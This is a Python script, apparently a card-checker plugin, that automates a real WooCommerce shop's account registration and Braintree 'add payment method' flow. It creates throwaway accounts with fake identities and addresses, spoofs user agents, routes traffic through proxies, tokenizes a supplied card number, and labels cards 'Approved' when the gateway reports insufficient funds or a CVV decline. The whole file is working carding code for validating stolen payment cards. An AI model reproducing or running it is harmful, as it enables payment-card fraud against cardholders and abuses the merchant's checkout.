import httpx
import string
import random
import base64
import json
import logging
import asyncio
from plugins.tools.address import fakexy
from faker import Faker

fake = Faker('en_US')

def get_str(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def random_email() -> str:
    return (
        "".join(random.choice(string.ascii_letters) for x in range(15))
    ) + "@gmail.com"

async def ki(cc, mes, ano, cvv, proxyg=None):
    address_info = fakexy('us')
    
    if address_info['error']:
        logging.error(f"Error fetching address: {address_info['error']}")
        return 'Error ⚠️!', 'Failed to generate address.'

    retries = 1 
    for attempt in range(retries + 1):
        try:
            async with httpx.AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:
            
                response = await session.get('https://surgicams.com/my-account')
                register_nonce = get_str(response.text, 'woocommerce-register-nonce" value="', '"')

                headers = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': fake.user_agent(),
                }

                data = {
                    'email': random_email(),
                    'password': 'vuumVByGU6PcaWz',
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register',
                }

                
                await session.post('https://surgicams.com/my-account/', headers=headers, data=data)

                response_billing = await session.get('https://surgicams.com/my-account/edit-address/billing/')
                billing_nonce = get_str(response_billing.text, 'name="woocommerce-edit-address-nonce" value="', '"')

                response_payment = await session.get('https://surgicams.com/my-account/add-payment-method/')
                token = get_str(response_payment.text, 'client_token_nonce":"', '"')
                payment_nonce = get_str(response_payment.text, 'woocommerce-add-payment-method-nonce" value="', '"')

                headers.update({
                    'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                    'cache-control': 'max-age=0',
                    'origin': 'https://surgicams.com',
                    'priority': 'u=0, i',
                    'referer': 'https://surgicams.com/my-account/edit-address/billing/',
                    'upgrade-insecure-requests': '1',
                })

                data = {
                    'billing_first_name': fake.first_name(),
                    'billing_last_name': fake.last_name(),
                    'billing_company': fake.company(),
                    'billing_country': 'US',
                    'billing_address_1': address_info['address'],
                    'billing_address_2': '',
                    'billing_city': address_info['city'],
                    'billing_state': address_info['state'],
                    'billing_postcode': address_info['zip_code'],
                    'billing_phone': address_info['phone_number'],
                    'billing_email': random_email(),
                    'save_address': 'Save address',
                    'woocommerce-edit-address-nonce': billing_nonce,
                    '_wp_http_referer': '/my-account/edit-address/billing/',
                    'action': 'edit_address',
                }

                await session.post('https://surgicams.com/my-account/edit-address/billing/', headers=headers, data=data)

                headers.update({
                    'accept': '*/*',
                    'referer': 'https://surgicams.com/my-account/add-payment-method/',
                    'x-requested-with': 'XMLHttpRequest',
                })

                data = {
                    'action': 'wc_braintree_credit_card_get_client_token',
                    'nonce': token,
                }

                req7 = await session.post('https://surgicams.com/wp-admin/admin-ajax.php', headers=headers, data=data)
                
                try:
                    json_response = req7.json()
                    client_token = json_response.get('data')
                    if not client_token:
                        logging.error("No 'data' found in JSON response.")
                        return 'Error ⚠️!', 'Failed Client Token Braintree'
                except json.JSONDecodeError:
                    logging.error(f"Failed to decode JSON. Response text: {req7.text}")
                    return 'Error ⚠️!', 'Failed to decode JSON from req7.'

                B64_ = base64.b64decode(client_token)
                finger = json.loads(B64_)['authorizationFingerprint']

                headers.update({
                    'authorization': 'Bearer ' + finger,
                    'braintree-version': '2018-05-10',
                    'content-type': 'application/json',
                    'origin': 'https://assets.braintreegateway.com',
                    'referer': 'https://assets.braintreegateway.com/',
                })

                json_data = {
                    'clientSdkMetadata': {
                        'source': 'client',
                        'integration': 'custom',
                        'sessionId': '46487356-76e8-4be7-9242-be0067bf5985',
                    },
                    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                    'variables': {
                        'input': {
                            'creditCard': {
                                'number': cc,
                                'expirationMonth': mes,
                                'expirationYear': ano,
                            },
                            'options': {
                                'validate': False,
                            },
                        },
                    },
                    'operationName': 'TokenizeCreditCard',
                }

                req8 = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
                card_token = req8.json()['data']['tokenizeCreditCard']['token']

                headers.update({
                    'content-type': 'application/x-www-form-urlencoded',
                    'referer': 'https://surgicams.com/my-account/add-payment-method/',
                    'upgrade-insecure-requests': '1',
                })

                data = {
                    'payment_method': 'braintree_credit_card',
                    'wc-braintree-credit-card-card-type': 'visa',
                    'wc-braintree-credit-card-3d-secure-enabled': '',
                    'wc-braintree-credit-card-3d-secure-verified': '',
                    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                    'wc_braintree_credit_card_payment_nonce': card_token,
                    'wc_braintree_device_data': '',
                    'wc-braintree-credit-card-tokenize-payment-method': 'true',
                    'woocommerce-add-payment-method-nonce': payment_nonce,
                    '_wp_http_referer': '/my-account/add-payment-method/',
                    'woocommerce_add_payment_method': '1',
                }

                req9 = await session.post('https://surgicams.com/my-account/add-payment-method/', headers=headers, data=data)
                try:
                    if "Nice! New payment method added" in req9.text or "New payment method added." in req9.text:
                        mensaje = "1000: Approved"
                        status = "Approved ✅"
                    else:
                        mensaje = req9.text.split('Status code ')[1].split('</li>')[0]
                        if "Card Issuer Declined CVV" in mensaje:
                            status = "Approved ✅"
                        elif "Insufficient Funds" in mensaje:
                            status = "Approved ✅"
                        elif "Gateway Rejected: risk_threshold" in mensaje:
                            status = "Declined ❌"
                            mensaje = "Braintree Rejected: Risk"
                        else:
                            status = "Declined ❌"
                    return status, mensaje
                except Exception as e:
                    linea = str(e.__traceback__.tb_lineno)
                    logging.error(f"An unexpected error occurred: {e} at line {linea}")
                    return 'Error ⚠️!', f'An unexpected error occurred with token at line {linea}.😓'
        except (httpx.RequestError, httpx.TimeoutException, json.JSONDecodeError) as e:
            logging.error(f"Attempt {attempt + 1} failed with error: {e}. Retrying...")
            if attempt == retries:
                linea = str(e.__traceback__.tb_lineno)
                return 'Error ⚠️!', f'An unexpected error occurred with Requests at line {linea}.😓'
        except Exception as e:
            linea = str(e.__traceback__.tb_lineno)
            logging.error(f"An unexpected error occurred: {e} at line {linea}")
            return 'Error ⚠️!', f'An unexpected error occurred with nonce at line {linea}.😓' 
